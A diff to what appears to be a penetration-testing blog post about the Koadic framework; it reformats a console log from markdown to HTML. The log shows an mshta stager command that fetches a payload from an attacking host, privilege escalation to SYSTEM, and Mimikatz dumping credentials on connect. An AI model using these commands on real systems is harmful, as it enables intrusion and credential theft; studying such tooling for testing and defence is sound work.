@@ -183,19 +183,17 @@ When you start using Koadic obviously you need to pip3 the "reqs" and get it set
 </center></p>
 
 <p style="text-align:justify;">
-Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:
+Once you get an active session (zombie) the fun really begins. Because I had the module set to run Mimikatz immediately on connect you can see that plain-text creds are dumped as soon as the Windows Server 2012 host calls back to my attacking machine. You can see that both a  NTLM hash and plan-text credentials were recovered:</p>
 
-
-```bash
-(koadic: sta/js/mshta)$ run
+<pre><code class="language-bash">(koadic: sta/js/mshta)$ run
 [+] Spawned a stager at http://AttackingIP:9999/sploit
 [!] Dont edit this URL! (See: 'help portfwd')
-[>] mshta http://AttackingIP:9999/sploit
+[&gt;] mshta http://AttackingIP:9999/sploit
 [+] Zombie 0: Staging new connection (100.27.25.153)
 [+] Zombie 0: WIN-LKC4723RPHF\Administrator* @ WIN-LKC4723RPHF -- Windows Server 2012 Standard
 [*] Zombie 0: Job 0 (stager/js/mshta) created.
-[+] Zombie 0: Job 0 (stager/js/mshta) privilege::debug -> got SeDebugPrivilege!
-[+] Zombie 0: Job 0 (stager/js/mshta) token::elevate -> got SYSTEM!
+[+] Zombie 0: Job 0 (stager/js/mshta) privilege::debug -&gt; got SeDebugPrivilege!
+[+] Zombie 0: Job 0 (stager/js/mshta) token::elevate -&gt; got SYSTEM!
 [+] Zombie 0: Job 0 (stager/js/mshta) completed.
 [+] Zombie 0: Job 0 (stager/js/mshta) Results
 
@@ -225,12 +223,11 @@ Administrator     WIN-LKC4723RPHF  (null)
 win-lkc4723rphf\$  WORKGROUP        (null)
 
 
-```
+</code></pre>
+
 <figcaption>
 <center>Dumping Creds on Connection</center>
 </figcaption>
-
-
 
 <p style="text-align:justify;">
 If you want to check the status of the compromised hosts that you have so far you can use the command <b>[Zombies]</b>.
